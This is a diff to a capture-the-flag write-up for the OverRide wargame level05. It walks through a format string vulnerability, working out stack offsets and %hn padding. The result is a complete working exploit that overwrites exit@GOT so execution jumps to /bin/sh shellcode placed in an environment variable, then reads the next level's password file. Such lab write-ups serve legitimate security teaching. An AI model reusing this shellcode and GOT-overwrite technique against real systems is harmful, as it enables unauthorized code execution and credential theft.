@@ -2,7 +2,7 @@
 
 ## Overview
 
-The binary at `~/level05` reads user input, converts uppercase letters to lowercase, then prints the result using `printf` in an unsafe way. This allows us to exploit a **format string vulnerability** to hijack the program's execution and spawn a shell as the next user.
+The binary reads user input, converts uppercase letters to lowercase, then prints the result using `printf(buffer)` — a **format string vulnerability**. After `printf`, the program calls `exit(0)` (not `return`), so we overwrite the GOT entry for `exit` with the address of shellcode stored in an environment variable.
 
 ---
 
@@ -26,7 +26,19 @@ This tells us the program converts uppercase (A-Z) to lowercase before printing.
 
 ---
 
-## Step 2: Analyze the disassembly
+## Step 2: Analyze the binary protections
+
+| Protection | Status | Impact |
+|-----------|--------|--------|
+| **Architecture** | i386 (32-bit) | 4-byte addresses |
+| **NX** | Disabled | Stack is executable — shellcode works |
+| **PIE** | Disabled | Fixed addresses (GOT at known location) |
+| **RELRO** | Partial | GOT is writable — we can overwrite `exit@GOT` |
+| **Canary** | Disabled | Not relevant (no buffer overflow) |
+
+---
+
+## Step 3: Analyze the disassembly
 
 Using GDB:
 
@@ -66,7 +78,7 @@ After the `printf`, the program calls `exit(0)`. It does **not** return from `ma
 
 ---
 
-## Step 3: Confirm the format string vulnerability
+## Step 4: Confirm the format string vulnerability
 
 We test by sending format specifiers as input:
 
@@ -80,7 +92,7 @@ Instead of printing `%x.%x...` literally, the program printed **values from the 
 
 ---
 
-## Step 4: Find our buffer's offset on the stack
+## Step 5: Find our buffer's offset on the stack
 
 We need to know **where on the stack** our input buffer sits, relative to `printf`'s perspective. We use `%N$x` syntax, which means "print the Nth argument on the stack as hex."
 
@@ -102,7 +114,7 @@ This means whatever we place at the beginning of our input, we can reference it 
 
 ---
 
-## Step 5: Find the GOT address of `exit`
+## Step 6: Find the GOT address of `exit`
 
 The GOT (Global Offset Table) is a table that holds the real addresses of dynamically linked functions. When the program calls `exit()`, it actually jumps to the address stored in the GOT entry for `exit`. If we overwrite this address, we control where the program jumps.
 
@@ -115,7 +127,7 @@ The GOT entry for `exit` is at address **`0x080497e0`**. This is the address we 
 
 ---
 
-## Step 6: Prepare shellcode in an environment variable
+## Step 7: Prepare shellcode in an environment variable
 
 We need somewhere to redirect execution to. We'll place **shellcode** (machine code that spawns `/bin/sh`) in an environment variable. The program's memory will contain this environment variable, so we can jump to it.
 
@@ -129,7 +141,7 @@ This creates:
 
 ---
 
-## Step 7: Find the shellcode's address in memory
+## Step 8: Find the shellcode's address in memory
 
 We need to know where in memory the environment variable ends up. We write a small helper:
 
@@ -149,28 +161,28 @@ gcc -m32 -o /tmp/getenv /tmp/getenv.c
 The `-m32` flag is important because our target binary is 32-bit. A 64-bit program would have different stack layout and addresses.
 
 ```
-0xffffd7f3
+0xffffd884
 ```
 
-The shellcode lives around `0xffffd7f3`. We'll target `0xffffd830` — aiming into the middle of the NOP sled for safety, since the exact address can shift slightly between programs due to differences in program name length and environment.
+The shellcode lives at `0xffffd884`. The 100-byte NOP sled gives a margin of error; we target `0xffffd884` directly (the sled absorbs small shifts).
 
 ---
 
-## Step 8: Craft the format string exploit
+## Step 9: Craft the format string exploit
 
 ### The plan
 
-We want to write the value `0xffffd830` into the memory at address `0x080497e0` (the `exit` GOT entry). When `exit()` is called, it will jump to our shellcode instead.
+We want to write the value `0xffffd884` into the memory at address `0x080497e0` (the `exit` GOT entry). When `exit()` is called, it will jump to our shellcode instead.
 
 ### Why use `%hn` (half-writes)?
 
-Writing the full value `0xffffd830` with a single `%n` would require printing over 4 billion characters (since `%n` writes the number of characters printed so far). That's not feasible.
+Writing the full value `0xffffd884` with a single `%n` would require printing over 4 billion characters (since `%n` writes the number of characters printed so far). That's not feasible.
 
 Instead, we split the 4-byte address into two 2-byte (short) writes using `%hn`:
 
 | Address       | Value to write | Meaning                    |
 |---------------|---------------|----------------------------|
-| `0x080497e0`  | `0xd830`      | Low 2 bytes of target addr |
+| `0x080497e0`  | `0xd884`      | Low 2 bytes of target addr |
 | `0x080497e2`  | `0xffff`      | High 2 bytes of target addr|
 
 ### How `%n` / `%hn` works
@@ -190,40 +202,28 @@ Since we control what's on the stack (our input buffer is at offset 10), we can 
 These 8 bytes sit at stack offsets 10 and 11 relative to `printf`.
 
 After these 8 bytes, we add format specifiers:
-1. `%55336x` — print 55336 characters of padding. Combined with the 8 address bytes already printed, total = 55344 = `0xd830`. Then `%10$hn` writes this count (as a short) to the address at offset 10 (`0x080497e0`).
-2. `%10191x` — print 10191 more characters. Total now = 65535 = `0xffff`. Then `%11$hn` writes this to the address at offset 11 (`0x080497e2`).
+1. `%55420x` — print 55420 characters of padding. Combined with the 8 address bytes already printed, total = 55428 = `0xd884`. Then `%10$hn` writes this count (as a short) to the address at offset 10 (`0x080497e0`).
+2. `%10107x` — print 10107 more characters. Total now = 65535 = `0xffff`. Then `%11$hn` writes this to the address at offset 11 (`0x080497e2`).
 
 ### The math
 
 - After the two 4-byte addresses: **8 characters** printed
-- We want to write `0xd830` = **55344** to the first address
-  - Padding needed: 55344 − 8 = **55336**
+- We want to write `0xd884` = **55428** to the first address
+  - Padding needed: 55428 − 8 = **55420**
 - We want to write `0xffff` = **65535** to the second address
-  - Padding needed: 65535 − 55344 = **10191**
-
-### Final exploit
-
-```bash
-python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55336x%10$hn%10191x%11$hn"' | ./level05
-```
+  - Padding needed: 65535 − 55428 = **10107**
 
 Note: the addresses `\xe0\x97\x04\x08` are written in **little-endian** byte order (least significant byte first), because x86 is a little-endian architecture.
 
 ---
 
-## Step 9: Run the exploit
+## Step 10: Run the exploit
 
 ```bash
-level05@OverRide:~$ python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55336x%10$hn%10191x%11$hn"' | ./level05
+(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55420x%10$hn%10107x%11$hn"'; cat) | ./level05
 ```
 
-The output will contain a huge amount of whitespace (from the `%55336x` and `%10191x` padding), and then a shell is spawned. To interact with it, pipe commands:
-
-```bash
-(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55336x%10$hn%10191x%11$hn"'; cat) | ./level05
-```
-
-The `cat` at the end keeps stdin open so we can type commands in the shell. Then:
+The output will contain a huge amount of whitespace (from the `%55420x` and `%10107x` padding), then a shell is spawned. The `cat` keeps stdin open so we can type commands. Then:
 
 ```
 cat /home/users/level06/.pass
@@ -233,7 +233,16 @@ This gives the password for level06.
 
 ---
 
-## Summary of key concepts
+## Final exploit command
+
+```bash
+export SHELLCODE=$(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55420x%10$hn%10107x%11$hn"'; cat) | ./level05
+```
+
+---
+
+## Key concepts
 
 | Concept | Role in the exploit |
 |---|---|
